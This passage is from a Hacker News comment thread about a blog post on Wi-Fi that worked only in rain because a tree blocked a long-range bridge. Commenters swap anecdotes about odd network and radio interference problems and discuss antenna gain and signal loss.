of sight for interference. reply chime 5 hours agoprevI had a similar experience about shipping pallet being fully loaded fixing server connectivity issues almost two decades ago: https://chir.ag/tech/?49 reply ummonk 5 hours agoparentThat must have driven you crazy. The loop bit makes it so counterintuitive since interference from the pallet was actually helpful. reply chime 4 hours agorootparentExactly. It was also my first real job as an IT manager, and I had just setup my first business wifi network for use with a shiny new Windows mobile scanner. So it definitely made me question if I was cut out for it. I left the company last year, having grown to 700+ employees in pharmaceutical manufacturing, a far-cry from my one-man IT department for 20 employees making shampoo. And while there were many, many weird issues over the years, none was ever so satisfying to resolve. reply obi1kenobi 5 hours agoparentprevOh wow, what a read! Great story, thanks for sharing :) reply thekevan 10 hours agoprevThis is a bit ridiculous. How can you know that you have a ling of sight element to you network and not check that as the very first thing when you hear about rain effecting the wifi? reply Animats 2 hours agoparentI had that feeling, too, especially when the author talks about climbing up to the endpoint to check the equipment. He knew it was a line of sight microwave link, so the first thing to check is obstruction or reflection by things that can move a little. I was thinking that it might only work when someone had a big flat-sided truck or RV in the right place to reflect the signal around something. I've had trouble with tree growth in other contexts. A tree once slowly grew tall enough to break the neutral wire on the drop from the power pole to the house. This put overvoltages on some 110V circuits. Computers were fine. Washing machine emitted a burning smell. More recently, tree growth broke a fiber line coming into my house. AT&T lineman came out and restrung fiber for three poles (I'm a ways back from the main road). He saw me running a desktop computer, slowly, tethered to a phone, and once fiber was reconnected, said \"Now you're back in 2023\". (Now to get rid of the dead cable. I have dead DirectTV coax, dead cable TV coax from whoever was before Comcast, and dead Pacific Bell copper, all abandoned in place and some of it sagging.) reply wodenokoto 4 hours agoparentprevThe retelling let's us know very early that there is a line of sight component, but when you are sitting there in the middle of a world of no internet, you might just think of it as a \"link\" to the office. reply Aissen 2 hours agoparentprevHave you never spent hours (or even days!) debugging an issue that seemed obvious in retrospect, once all incorrect assumptions have been eliminated? reply rvba 10 hours agoparentprevIt sounds fake, especially as the solution would be to get the original equipment higher, instead of buying new equipment? Also why not lay a cable. reply NoPicklez 5 hours agorootparentYou can't just lay a cable across a public street Also, if it was roughly 10 years ago then upgrading to N wireless was a good solution anyway. Not only did it solve the problem but it would've given then quicker speeds. reply Uehreka 9 hours agorootparentprev> It sounds fake I don’t think so. I definitely know tech people who get a particular idea in their head and will debug it to hell and back before taking a step back and realizing the obvious thing they missed. I’ve definitely done it before myself. > Also why not lay a cable. It sounds like they were trying to run a network between two properties that weren’t adjacent. They may not have had permission from the neighbor in the middle to lay cable on their property, or it might’ve required laying a cable across a street. reply obi1kenobi 9 hours agorootparent(Author here) Across several city blocks, in fact, and longer than the max range of Ethernet on normal (Cat 5/5e/6) cables. Past ~300ft/100m, you need a repeater even for Ethernet. We would have needed at least one repeater somewhere along the line, which adds even more cost and complexity on top of needing to get permits from the city and approvals from all the neighbors in between. Anyone that says \"just go get a permit from the city\" has never tried doing it. reply xxs 3 hours agorootparentAs for cable, you'd use fiber optic. There is really no need to go with copper in such a case. Other than that I'd agree about your solution being optimal back then, and now. Btw how did you check the power brick, peak to peak voltage measurements? Bad capacitors is likely the single most common failure. reply pmontra 4 hours agorootparentprevWhat happens when the tree grows taller? Would the new wifi still go through leaves and branches? Edit: it probably did as the story is 10 years old. reply fouc 9 hours agorootparentprevRaising the original equipment might not have been possible, and likely would've only been a temporary solution as the tree could keep growing taller. reply Gazoche 7 hours agorootparentprev> Also why not lay a cable. According to the stories the two bridge endpoints were in different buildings a few blocks apart. You can't just lay a cable in the middle of a public street. reply incompatible 9 hours agorootparentprevIt's just from some guy's office to his house, they aren't going to lay a cable across a few city blocks. reply obi1kenobi 9 hours agorootparent(Author here) Worse: to the balcony of our apartment building. Imagine asking your HOA how they'd feel about you mounting your antenna \"higher\" AKA on someone else's balcony or on the roof above someone else's apartment. \"Just\" move it higher vs replace ~10yr old (at the time) equipment with newer, faster equipment that doesn't have the problem? Easy answer if you ask me, and I'd make the same choice again with ~10yrs of retrospect -- the same 802.11n antennas are still there today! reply chinchilla2020 9 hours agoparentprevMost likely a fake story. The internet is littered with blogs that make up stories like this to get engagement. After all, this one made it to the top of hackernews. Chances of getting proof that this happened are zero reply mgarciaisaia 3 hours agorootparentNever let reality ruin a nice story reply koyote 9 hours agoprevOne of my most recent 'weird internet issues' was when I upgraded our 50mbit internet connection to 100Mbit and my laptop never really reached 100Mbit whereas my homelab easily got 100Mbit on speed tests. It took me a while to realise the difference was that the homelab was physically connected and the laptop was using Wifi. The laptop wifi was connected to the AP at ~1.2 Gbit and a different machine had the same issue. I decided to see what the internal network speed was and found that sending/receiving files to the homelab from a wifi device was also maxing out at ~90mbit. This then steered me towards looking at the connection between the AP and the router, and I realised that the Wifi AP was connected at 100Mbit to the router instead of 1Gbit. Turned out the cheap CAT7 cable that I randomly used to connect Wifi to the router because it looked nicer than the existing cable was not actually a real CAT7 cable and only provided 100Mbit. Changing the cable fixed the issue! Out of paranoia I decided to replace all of my ethernet cables with decent quality ones. I don't even remember where that 'fake' cable came from; probably from some random Aliexpress appliance that I bought at some point. I've had similar issues with USB cables that I've amassed, where I forget where they came from and only realise later that they barely fulfil their purpose. reply _nivlac_ 8 hours agoparentI'm getting confused reading your first sentence based on the rest of your comment; should homelab and laptop be swapped? reply koyote 8 hours agorootparentI don't think so (but I am a bit tired today, so maybe something I wrote makes no sense :)). Homelab is physically connected to the router whereas the laptop is connected via Wifi. It was the cable from the Wifi AP to the router that was dodgy which caused the issue. I noticed because the laptop would never reach 'true' 100Mbit download speeds whereas the homelab did. reply user_7832 16 hours agoprevTIL about Fresnel Zones! > Interestingly, objects outside the straight line between antennas can still cause interference! For best signal quality, the Fresnel zone between the antennas should be clear of obstructions. But perfection isn't achievable in practice, so RF equipment like Wi-Fi uses techniques like error-correcting codes so that it can still work without a perfectly clear Fresnel zone. I wonder if other waves like pressure/audio waves also have a similar effect. [1] - https://en.wikipedia.org/wiki/Fresnel_zone (Side note, is this story old? 802.11n isn't particularly new enough to upgrade to.) reply tgsovlerkhgsel 9 hours agoparentMy mind was blown when I saw the 4F experiment, where a lens transforms an image into the Fourier domain. I'm not sure if it's related to the Fresnel zone (I think it is not or only very vaguely), but it's pretty amazing: A widened beam of collimated light (i.e. parallel beams) is sent through e.g. a slide with some image printed on it. Using a lens placed one focal length away, it is focused down to a point (one focal length from the lens). One more focal length from that point, the beam will have reached its original width again, and another lens makes it parallel again, projecting it onto a screen placed one focal length from the second lens:() . ()image lens point lens screen This will behave exactly as expected at first glance. The image will be visible on the screen (upside down IIRC) and if you hold a piece of paper into the point, you'll just see a single bright dot. However, what's actually present (due to diffraction) is the Fourier transform of the image! If you put an iris around the point, the image on the screen becomes blurry because you just filtered the high frequencies! And what's even more impressive, if you remove the center of the point (e.g. by inserting a glass slide with a small black circle in the middle), you'll get only the high frequencies, and the image on the screen will be the edges of the original image. reply obi1kenobi 8 hours agorootparentWow! Are you maybe able to find a demo video of this? I'd love to see it! (I'm the author of the post btw) reply avianlyric 16 hours agoparentprevYes they do. That’s what an echo is, sound waves bouncing off an obstacle between two points. That obstacle doesn’t need to be within the direct line of sight, just within the dispersion area of the outgoing sound wave. At the far end you’ll hear (although in reality, your brain will almost certainly cover this up for you) distortion caused by the sound wave defracting off the obstacle and interfering with the primary wavefront. Hence the reason why people put so much effort into design concert halls, and adding sound dampening treatments to recording studios. Obstacles will distort sound, but energy absorbing obstacles will distort less. reply Intralexical 14 hours agorootparent> At the far end you’ll hear (although in reality, your brain will almost certainly cover this up for you) distortion caused by the sound wave defracting off the obstacle and interfering with the primary wavefront. See: https://en.wikipedia.org/wiki/Human_echolocation reply progbits 15 hours agoparentprev> Side note, is this story old? FTA: > At the time, I was still a college student — this was over 10 years ago. reply aidenn0 12 hours agoparentprevI wonder how much polarization affects things; I was once told that terrestrial FM Radio is transmitted with vertical polarization to reduce interference from tall objects between you and the transmitter. Terrestrial TV (some of which used bands that overlap FM radio) uses horizontal polarization. reply hinkley 16 hours agoprevI remember hearing about a few common failure modes for early internetworking of adjacent buildings. The first being running a bare twisted pair cable between buildings. Worked fine until the next lightning storm, and then a nearby strike fries the equipment on both ends. You have to use grounded conduit to run strands between buildings my dudes. But the other one was setting up WiFi between buildings, and tended to be more of a problem in academia because the yearly cycles make it a bit more likely. If you set it up in the fall, and everything works all winter until spring comes, when the water in the deciduous tree leaves attenuates the signal. The nasty part of this one is not the failure mode but the timing. Everyone has been happily using and depending on their sweet sweet bandwidth for six months and poof, it’s just gone one fine April morning. reply progbits 15 hours agoprevSimilar but opposite story: 20ish years ago I hung out in an IRC channel in which, during autumn/winter months, one person would frequently get disconnected and when he came back complained about foggy weather. He had a laser line or sight connection. It could handle rain (with some degradation), but thick fog killed it. reply outworlder 13 hours agoparentFunny. A few years ago I was on #chicken, and there was a person frequently connecting and disconnecting. Turns out they were on a boat and the motion of the boat would be enough to disrupt their wifi directional antenna. They were rigging a servomechanism to automatically aim the antenna and wanted to write the control software in Chicken Scheme (for whatever reason, never questioned because Chicken is fun). reply kayodelycaon 14 hours agoparentprevYeah. If you're outside during a calm day with snow falling, it's unusually quiet because large fluffy snowflakes absorb sound. Fog does something very similar to optical or radio systems. Rain has much bigger droplets and far fewer of them. :) reply redbell 2 hours agoprev> Happy April 1st! This post is part of April Cools Club: an April 1st effort to publish genuine essays on unexpected topics. Honestly, reading \"April 1st!\", I was expecting this to be one of April's fools but it turned out to be a true and amusing story. The author was lucky to solve a technical problem in a non-technical way, unlike me! A decade ago, I had a weird Internet connection issue. The upload speed suddenly dropped to near zero kb/s while the download was alright. I contacted my ISP, and for weeks, they were unable to figure out what was going wrong. I reached out to my neighbor and offered him to pay his Internet bill in exchange for sharing his Wi-Fi with me until my ISP solves my problem, and he kindly agreed. After about three months, my ISP's technical staff was still unable to fix the issue. I gave up, and guess what I did to get around this?! I just moved away to another distant home. reply asimpleusecase 6 hours agoprevWe had an office in a very old building downtown with no access to fibre. The best internet we could get at the time was a 3G router in the window. Every afternoon at the same time our connection would drop down below 1 Meg and become unusable. Eventually we realised that down the street there was a large school and every afternoon when classes were over, hundreds of young people would turn in their phones and saturate our cell. reply mungoman2 15 hours agoprev> The fix was easy: upgrade our hardware. This made me smile. My brain autocompleted the fix to something like \"help the neighbors trim their tree\", but of course the fix is new hardware. reply themadturk 15 hours agoparentWell, that would have meant interacting with other people... reply kyawzazaw 13 hours agorootparentcan't really be that entitled and ask them to cut their tree (or even if you do it by youself) reply obi1kenobi 12 hours agorootparent(I'm the author.) I really like trees! So I wouldn't have wanted to cut it down or even prune it. Also, I hate operational (ongoing) solutions to problems. Pruning it would have been exactly that kind of solution -- we'd have had to prune it regularly or else it would have kept being a problem every so often. The hardware fix was easier: our equipment was already a bit old and slow, the upgrade fixed the rain problem while also making it faster, and it's not something we've had to tweak since. I've long since moved out, but my parents still use that same 802.11n bridge today! reply nate 14 hours agoprevWhile we're on the subject: I still can't solve this and thought you'd either laugh or you are the only people who know what I'm going through :) I have some fancy Asus Mesh wifi routers at home. I sit next to the cable modem and one mesh endpoint. My wife sits upstairs. there's an upstairs mesh endpoint but I think neither of us are usually connected to it (mostly serves to extend our connection to go to yard). But when my wife gets up from her desk and walks through our hallway (closer to the non often used mesh endpoint) our internet drops for a bit. My only guess is that the endpoints get mad at meat being in between their back haul? Anyone deal with this and figure out the solution? reply Animats 2 hours agoparentDefinitely people can absorb enough RF to block WiFi. I hit this in a hotel, back when I was doing steampunk conventions. Antique Teletype machines put into brass and glass cases, getting text messages over the Internet. (Early versions of this used Google Voice to read SMS; later versions used Twilio.) The hotel lobby had WiFi, but the function room we were in did not. I'd tested in advance, and was able to get a good WiFi connection with the room empty. But once it filled up with people, we couldn't get through. Had to run out to Fry's and buy a WiFi booster. reply isodude 13 hours agoparentprevActually, if you take a peak in to the wifi logs on the asus mesh node, you might see that it freaks out and restarts the wifi service. There's a tail mode that is pretty nice. Restore to the default settings, make sure you have updated the firmware, and cross your fingers. reply chedabob 13 hours agoparentprevEMI maybe? Certain chairs cause monitors to go blank for a few seconds. https://mastodon.social/@haeckerfelix/110272427676278609 reply duffyjp 13 hours agorootparentI think my chair does this, but only when I'm not sitting in it. Maybe my body absorbs the ESD? If I'm doing anything nearby and bump the chair there's a good chance my monitor will lose signal for a second. It happens with both HDMI and Displayport with a number of different GPUs and different computers. The USB-C connection has never had a problem. I'm in an older home with questionable wiring which I'm sure is also a factor. I'd replace the chair but it's so dang comfy. reply madaxe_again 13 hours agoparentprevStrange as it may seem, try turning the power on each endpoint down. You may be getting signal from too many APs in the same place making the mesh elector freak out. reply konstantinua00 12 hours agoparentprevjust to dispell my paranoia: are you sure there aren't any cables under the floorboards there? reply jonathanlydall 12 hours agoprevWhen I started reading this it seemed like “internet” and WiFi were being conflated, for example on our neighbourhood WhatsApp group there are often people asking “Is anyone else’s WiFi down?”, when what they should ideally be asking is if anyone else’s (fibre) internet is down. In such cases I internally frown a little, but leave it there. Anyway, for the situation in this link, they actually have a WiFi bridge from their house to their office which has the connection to an ISP, so it is absolutely accurate to say the WiFi was down in this case. reply obi1kenobi 12 hours agoparent(Author here) Yeah, my dad's company does this stuff for a living, so I learned to distinguish all the terminology very early on :) reply t_tsonev 1 hour agoprevRain can improve signal quality by lowering the noise floor. Essentially, it drowns out the weaker signals originating from other emitters, making your own signal stand out. reply ummonk 5 hours agoprevI feel like this story started off seeming way more mysterious than it actually was because it took so long to get to mentioning the crucial bit (the long distance WiFi bridge). reply alhirzel 7 hours agoprevReminds me of this story about repairing a large power line: https://www.jwz.org/blog/2002/11/engineering-pornography/ reply shmeeed 2 hours agoparentFYI, JWZ blocks linking from HN. reply Jean-Philipe 2 hours agoprevReminds me of that time when my desktop computer wouldn't turn on if the printer's USB was plugged in to the wrong kind of port. Took me some time to figure that one out. Or that other time, when my mom's phone started crashing all of a sudden. Until we discovered, that it was caused by her new ID card in the folding phone case touching the back of the phone. reply neon5077 12 hours agoprevHere's my own 500 mile email story. This happened to me about a year ago. Just a normal day at the office when suddenly the internet drops out, except for my machine. Everyone else has a network connection, but no internet. Except for me, I can't reach devices on the local network, but I can reach anything outside. Now, our network is not large or complicated. We have a consumer grade ONT and WiFi router provided by the ISP, and a big unmanaged ethernet switch. There's really nothing to go wrong here. After some debugging, I notice that I have been assigned an IP address in my ISP's public block. Tracert seemed to show no local network between me and the WAN. It was as if the router had somehow connected my WiFi client directly to the ONT, bypassing the local network. That only barely makes sense, but it was my best guess so I condemned the router. Next day, new router, same problem. I couldn't explain it. This time though, I didn't have an internet connection, but local network was reachable. Some sanity restored, ar least. Turns out that our fiber line had been accidentally cut during construction work. Once the ISP fixed that, all was normal. The question remains, how did I have internet connection through a severed fiber line? It's not likely that the router had a bizarre failure right before the line was cut. I suppose it's possible that Windows had sneakily connected me to some other WiFi network, but then why did I have a weird IP address? I have no explanations reply jffhn 11 hours agoparentHere is mine. The admins could connect to their machines, but not to any user machine. It was winter and we had some heating issues, so I made a script \"warmup_the_office.sh\" that was meant to launch a \"while(true){}\" on each core of each PC of the office, but instead launched itself indefinitely on each and all reachable machines, exhausting all pids and preventing distant logging. We had to reboot everything by hand, after some nice warmup. reply hunter2_ 11 hours agoparentprevDoes your machine have a cellular modem that gets prioritized only when there's no route to some well-known service via the normal network adapter? And you disabled it (but forgot to mention doing so in this story) around the same time as swapping routers? reply friggeri 13 hours agoprevI've had a similar weather experience where my internet connection dropped when it was cold. Turns out some water had seeped into the optical fiber connector, when it froze it broke the connection, and it would recover when it thawed. This one was a nightmare to troubleshoot. reply mart2d2 15 hours agoprevAt Pinterest, when we were working from one of the founder's apartment, the internet went down. Lots of debugging later and we traced it to a cable that a squirrel had chewed threw.. reply smeeth 16 hours agoprevI had an experience like this once! My my laptop would inexplicably and intermittently stop connecting to the internet. It turned out my bluetooth headset was using the same band as the wifi but I only figured this out after a few months and a replaced wifi card. I wouldn't wish that experience on my worst enemy. reply progbits 15 hours agoparentSame, my macbook had unusable wifi when playing music via Bluetooth headphones. Switched to playing from my phone, somehow that worked - probably problem with the BT radio in the laptop since I didn't change wifi channel. reply bonton89 15 hours agorootparentAren't bluetooth and wifi typically on the same module these days? The worst interference problem I've heard of is how USB 3.0 uses 2.4ghz and therefore can cause problems with devices connected with it. reply Dylan16807 15 hours agorootparentIt causes a big smear of interference but one of the higher regions is inside the 2.4GHz band. reply maxglute 13 hours agoparentprevI have a fancy microwave that degrades my fancy bluetooth headset but not others. Did replacing the wifi card work? I'm wondering if I need to switch up my expensive microwave, or expensive headphone, because replacing bluetooth dongle (with another generic one with same chipset) hasn't resolved issue. reply MerManMaid 9 hours agorootparentMicrowaves use the 2.4ghz spectrum but typically not with any real precision which means that while in use they just tank the 2.4ghz spectrum. *As an aside, one of my favorite things I get to do at work is when onboarding new Jr. Net Engineers is getting them take our spectrum analyzer into our office kitchen and instructing them to watch the spectrum turn bright red while I make a bag of popcorn. Anyhow to get to your question, the best answer would be to get some distance between your microwave and set-up you're using with the headset. Otherwise if that isn't possible, then you'll want some headphones that does use 2.4ghz. Replacing the microwave will likely not fix the problem since they all use 2.4ghz band for cooking and at least I've never seen one shielded well enough that it didn't impact others while in use. reply robocat 1 hour agorootparentGood debugging story: https://www.theguardian.com/science/2015/may/05/microwave-ov... reply hobs 16 hours agoparentprevTurns out most consumer electronics operate in the same unlicensed consumer bands, so your bluetooth mouse, headset, wifi, and microwave all tussle for the same stuff. I had a fun one where every time I would get out of my chair my monitors would turn off, turns out the EM fields from the compression/decompression can actually be enormous in some cases. reply abhorrence 10 hours agorootparentI've experienced something similar, but the chair's discharge was interfering with a PCI riser, tripping just over some threshold that would cause the OS kernel to panic and shutdown. It felt so incredibly unbelievable when we first noticed the correlation that we called tons of people over to watch us demonstrate it just to see if there was something else we were missing. reply hot_gril 14 hours agorootparentprevMy Mac Pro desktop used to wake up whenever I used a MacBook Pro in the same room. Obvious thought was, maybe the laptop was sending wake-on-lan packets for some reason. Turns out, the carpeting in that room tends to create static buildup, and my MBP's charger was not grounded. Touching the laptop would send a mild discharge into the wall line, tripping something in the desktop's PSU to wake it up. reply rrr_oh_man 15 hours agorootparentprev> I had a fun one where every time I would get out of my chair my monitors would turn off Wait, can you elaborate? I have the same and I thought I was hallucinating or tripping a cable somewhere. reply lights0123 15 hours agorootparenthttps://superuser.com/questions/1406140/monitor-screen-that-... https://www.theregister.com/2020/01/09/office_chair_emission... reply hobs 14 hours agorootparentHah yep, I figured it out after reading the superuser post which led me to some ancient electrical engineer stuff. Update: reading the reg one, it also had no cusions, it was a standard herman miller so it was a mesh bottom and back. reply ctoth 15 hours agorootparentprevhttps://old.reddit.com/r/amateurradio/comments/f7g1sa/gas_li... reply treflop 16 hours agoparentprevI couldn't use my apartment complex's laundry machine if I was still connected to my own Wi-Fi (and using it). It would interfere with the Bluetooth signal. reply ajmurmann 12 hours agoprevThis reminds me of a taxi driver in Dubrovnik, Croatia who told me that his cel service would not work when it rained because the rain changed transmissions where he lived in a way that meant that his phone would connect to a cel tower one valley over which was in Bosnia where he didn't have a data plan. reply seabass-labrax 11 hours agoparentNot for long! Once the republic of Bosnia and Herzegovina becomes a member state of the European Union (a process which is seemingly progressing smoothly), it will be part of the European mobile phone 'roaming area' that is regulated as per PE/51/2018/REV/1. End result: your taxi driver's data plan will work whatever the weather :) reply rvba 10 hours agorootparentWill EU ever allow them in? With the problem of Hungary vetoing a lot (to help Russia) letting B&H in does not look smart. B&H comes with its own bag of problems too. reply jcranmer 5 hours agorootparentOf the European countries currently looking to join, Bosnia & Herzegovina will probably be the last one to actually make it. Which is pretty surprising considering that Kosovo has a is-this-actually-a-country dispute within the EU (which also blocks Serbia's accession), and Moldova, Georgia, and Ukraine have not-so-minor problems of not being able to control portions of their territory thanks to Russian occupation. The Russo-Ukrainian war reignited a desire in the EU to actually enlarge towards the Balkans and Eastern Europe. But the countries that haven't joined aren't in great shape (the healthier bits of Yugoslavia joined earlier), and it's not clear to me that any of the current batch countries (especially Bosnia) will be able to join before such desires cool again. reply bombcar 16 hours agoprevI had one recently - old Nintendo switch; worked fine when docked, couldn't get an internet connection on wifi. Turns out it had been so long that the wifi MAC was picking up a DHCP address that was blocked at the firewall; the dock had its own MAC so it got a good address. reply jonhohle 13 hours agoparentWere you using an Ethernet adapter? The original switch dock has a DisplayPort to HDMI adapter and USB hub. It doesn’t do anything with networking. The OLED dock adds ethernet (and therefore a second MAC). reply bombcar 13 hours agorootparentIt was the old switch in the new dock; which was why I was going insane. Both worked in the dock, but only the OLED worked outside the dock. Had to sit down and think about it for awhile before I realized it had to be the firewall blocking access somehow. reply takinola 13 hours agoprevThese are great stories but awful experiences to live through. I am currently going through one right now. My wireless CarPlay connection shuts off whenever I drive past a particular highway section. It never happens anywhere else but this one area. There is nothing of note happening there (it's on a bridge over a lake) but just like clockwork, my entertainment system shuts down and refuses to connect. I have tried everything (reboots, firmware updates, wired connections, etc) to no avail. reply ranie93 13 hours agoparentI wonder if some kind of jammer is running in that area. Reminds me of a similar story: https://www.theverge.com/2014/5/1/5672762/man-faces-48000-fi... Weird that even a wired connection does not work. Stay curious! reply takinola 13 hours agorootparentMy first thought as well was there could be something emitting an intense signal in the vicinity that is interfering with the connection. However, there does not seem to be anything nearby (like I said, it is on a bridge going over a lake). reply devilbunny 7 hours agorootparentThis isn’t your problem, but I had a 1994 Pontiac Bonneville whose trunk release signal was triggered by some kind of radio signal that was part of a reasonably common system (security? Anyway, this was late 90s). If I parked in certain locations (certain stores) my trunk was guaranteed to open. It was sometimes so bad that I would have to start the car, set the parking brake, shift to neutral (any gear other than park blocked the remote trunk release), close the trunk, and only then get back in, release the parking brake, and drive off. Otherwise I didn’t have enough time to start the car and get in gear before the trunk opened again. As a practical solution, I used a short bungee cord to keep it from opening far enough to be obvious, and never kept anything of value in the trunk if the car would be unattended. reply rconti 15 hours agoprevMy guess was that the directional antennas were off by enough that it didn't work well in clear conditions, but the rain refracted the signal enough to work. The actual answer was better :D reply d1str0 14 hours agoparentThis was my first thought too. Tree makes more sense. reply stanleykm 14 hours agoprevAs soon as they mentioned the directional wifi i knew it was something physically between the antennas but was guessing human behavior. The tree was a surprise. reply tantalor 15 hours agoprevI dislike calling this \"magical thinking\", just because the plausible causal relationship takes a little time to discover, it's not implausible at the outset. In fact, the causal relationship between rain & wifi is taken as a given by the author: > If anything, rain makes wireless signal quality worse It's not too surprising to discover a causal relationship between two things we already know are causally related. reply superb_dev 15 hours agoparentYou don't think it's unusual to find a positive correlation where there is usually a negative correlation? reply tantalor 12 hours agorootparentUnusual yes, magical no reply thsksbd 8 hours agoprevGood read, but i was convinced as soon as i read the title that the rain was shielding the house from a near by transmitters that was blasting too much power. reply miragecraft 3 hours agoprevThis is how you know the WiFi is Garbage - only happy when it rains. At least you get a clue in this case (and the famous 500 miles email), I was having sporadic disconnections with cable internet for the last 2 month and my ISP can’t find anything wrong. Had to switch back to DSL and pay more for slower speed. reply mywacaday 15 hours agoprevI know of a case in the Caribbean where where a line of sight connection between two buildings of a bank was being interrupted by a tree from a competitor bank. They asked the competitor would they mind cutting the tree and the answer was sure for the small fee of 1 million, Third hand info but I did hear from a network guy I worked with. reply zoeysmithe 14 hours agoparentThe real lost opportunity here was figuring out the cost of running fiber instead of wireless and charging the $1 less than that for the tree trimming. reply wildylion 7 hours agoprevI also had another story: my friends asked me to troubleshoot their DSL connection. It dropped out sometime after the sun set and came back in the morning. Sure enough, this turned out to be RFI from newly installed solar invertors, creeping down the shield of an unused CB radio coax that ran parallel to the phone wiring. Grr, I hate DSL... reply Tade0 14 hours agoprevMy Wi-Fi used to work better in the rain because our signal was fairly weak as it was coming from the apartment behind the wall and the channels were generally crowded so (I assume) rain helped to at least insulate us from the networks in the buildings across the courtyard. reply hot_gril 14 hours agoparentThat's what I thought this article would be about before I read it. I've observed the same thing before. reply timkofu 2 hours agoprevThis should have been a microwave link from the start. reply xeromal 15 hours agoprevThis reminds me of when I took my PS5 to my family's house for Christmas vacation. We both have the same SSID because I set up both access points but they changed the password when they forgot it because they're a bunch of bozos. My PS5 controller refused to connect to my PS5 and I couldn't figure out why. I gave up and after a few days tried again only to realize that the PS5 controller can't connect to the PS5 wirelessly when the wifi was connected but the password was invalid. I still don't know why it was a problem or if it still is a problem but it was a monster to debug. lol The reason I didn't fix the wifi in the first place was that I didn't have a spare USB C to USB A cable to hardwire my controller and I was playing a singleplayer game. I think it was last of us. reply asveikau 14 hours agoprevReminds me of a song by Fleetwood Mac. Wifi only woooorks when it's raaaaining ... reply askvictor 6 hours agoprevWhen it's extremely windy, our office Internet or Wifi speed slows down. Haven't worked out why yet. We have fibre to the building, so it's unlikely the uplink. But you never know. reply srvmshr 6 hours agoparentIt may not be the Wifi but something more upstream. If ISPs interlinks have microwave towers, then the physical swaying would have some effect on channel interference. I don't quite understand how (because the general direction remains the same over large distance) - but I have observed this to happen. reply wildylion 10 hours agoprevOne of the sysadmins at a friendly company had the same problem... only that it was a >2km link in a densely built-up city and it turned out to be a crane that moved in on rails each morning with the beginning of a shift and then moved out in the evening! Took a guy standing there with binoculars to realize what was going on... reply cdme 15 hours agoprevI once had a Time Warner tech blame the moisture content of the air for impacting the copper cabling to explain outages at our apartment. This both makes more sense and, I suppose, is more interesting. reply devilbunny 7 hours agoparentMy parents’ house was connected to old copper phone lines from ca. 1940, and by the 1980s rain intrusion from long or heavy storms would cause massive static on the line (made worse when squirrels ran on the line). This was disastrous when I got my first modem ca 1986. Just unusable until it dried out. reply emmanueloga_ 14 hours agoprevI own a Ford Focus and to this day I don't understand why sometimes the gear shifts make this cracking noise when decelerating to zero, but only when it is raining. reply serf 13 hours agoparentcar clutches and brakes famously act/sound different in the wet, maybe a clutch or friction material somewhere acting differently? reply duffyjp 13 hours agoparentprevIs it a 2012-2016 model? Those have the PowerShift transmission (known as the PowerShit on forums) that had a class action settlement, though I think it's too late to cash in on that. reply emmanueloga_ 12 hours agorootparentyeah, maybe that's it :-/ reply mulmen 13 hours agoparentprevABS? reply dgoldstein0 12 hours agoprevI was fully expecting the answer to be that the rain was tamping down some unknown source of wifi interference... Which is a reasonable hypothesis if the packet loss is also within the home network. I was not expecting the home Internet all went over a long range WiFi bridge, but knowing that a tree makes far more sense as the problem. Strange how it correlates with rain that way. reply bongodongobob 13 hours agoprevI have a hard time believing this. Wifi can go through multiple walls. And if these were directional P2P links, they can easily go through and even around trees, I've deployed them in the past and they don't need perfect line of sight. Granted the equipment could have been cheap, but this sounds questionable. He's asserting that the a few leaves at the top of a tree were blocking it when it wasn't raining? Idk. reply obi1kenobi 13 hours agoparentI'm the author. Among other things, it's a distance problem -- WiFi can go through walls when the router is right there. But distance attenuates the signal as distance squared, and in this case we're talking about hundred+ yards/meters instead of just a couple. reply bongodongobob 13 hours agorootparentFair point. I suppose it's very much device dependant. The P2P stuff I've used was good for a few km. reply IshKebab 13 hours agorootparentprev> in this case we're talking about hundred+ yards/meters instead of just a couple. Sure but didn't you say you were using directional antennas? reply obi1kenobi 12 hours agorootparentNo antenna is directional enough to overcome n^2 scaling. Especially not the mid-tier consumer-grade hardware I would have had access to at the time. Rough rule of thumb, a consumer-grade directional antenna (at least at the time, maybe they've improved in the last 10yrs) will give your signal strength a one-digit multiplier (say ~8x), meaning ~7-10dB. But that n^2 means that improvement only takes you 2-3x farther, not 8x. Here we're talking about ~100x the distance, which would need a 10000x = 40dB improvement in signal strength. AFAIK an antenna like that would cost more than the entire city block where I grew up reply Dylan16807 10 hours agorootparentWon't 20dB at each end do the job? You can get 16-17dB antennas for $35 these days. And a wire parabolic dish promising 23dB for $200. 7-10dB matches the antennas I personally use, but those antennas are smaller than my phone. You can get a lot more out of a three foot spike or a two foot dish. (I'm assuming 2.4GHz and hoping they're not lying about the gain.) reply obi1kenobi 9 hours agorootparentRight. This is a multiple timelines problem. This story happened a bit over 10 years ago at this point. At the time of the story, the Wi-Fi bridge was already almost 10 years old -- we'd had the same equipment since I first remember getting internet at home. That means the antennas at the start of the story were mid-2000s mid-tier consumer level equipment. I don't think a 16-17dB antenna would have been $35 at the time, in either mid-2000s dollars or in today's dollars. I also grew up in a country much poorer than the US, where $35 could feed a family for a week. At the end of the post, we upgraded to 802.11n antennas (but still tech from 10+ years ago) which solved the problem by being newer, nicer, and having beamforming + MIMO capability which let them be more tolerant of obstacles (effectively, get more dB at the same emitted power level). reply Dylan16807 6 hours agorootparentI'm not trying to critique the solution, I just think the decibel issue isn't so dire and other factors were more important. Which is supported by the way the problem was fixed. As far as what was available at the time, I can't think of a super easy way to check that far back, but I will note that the 17dB stick antennas on Amazon have been available at the same price or cheaper for about 10 years. reply NovemberWhiskey 12 hours agorootparentprevFree space path loss over 5 meters with non-directional antennas is the same as over 500 meters with 20 dB of gain at each end. reply freedomben 12 hours agorootparentpreva directional antenna increases the gain of the signal, but it doesn't fix the problem of decreasing with square of the difference and physical objects blocking signal. If the distance was already near the maximum, it wouldn't take much to block it. reply londons_explore 13 hours agoparentprevWifi normally uses adaptive transmit power and data rates. If the signal gets a bit weaker, your link slows down from say 300 Mbps to 260 Mbps. No biggie. But sometimes for direct links you set the modulation, power and data rate fixed. The end result is that changing channel conditions can turn the link from 'working perfectly' to 'not working at all' reply obi1kenobi 9 hours agorootparent(Author here) For our Wi-Fi bridge, the devices on both ends were set to max power. I don't recall them being able to change data rates very much (if at all) because the ones at the beginning of the story were 802.11g devices, and 802.11g didn't have channel bonding capability or similar tricks up its sleeve. Newer equipment definitely has more options like this. reply 4gotunameagain 13 hours agoparentprevI cannot know whether the story is true, but wet leaves definitely would interfere more with the link. The typical water content (and conductivity) of tree leaves is relatively low, and it could also be a factor apart from the aforementioned sagging due to the water's weight. It is also true though that rain water has low mineralisation, and therefore low conductivity. reply ThrowawayTestr 11 hours agoparentprevKeep in mind this was a 802.11g network. reply singingfish 11 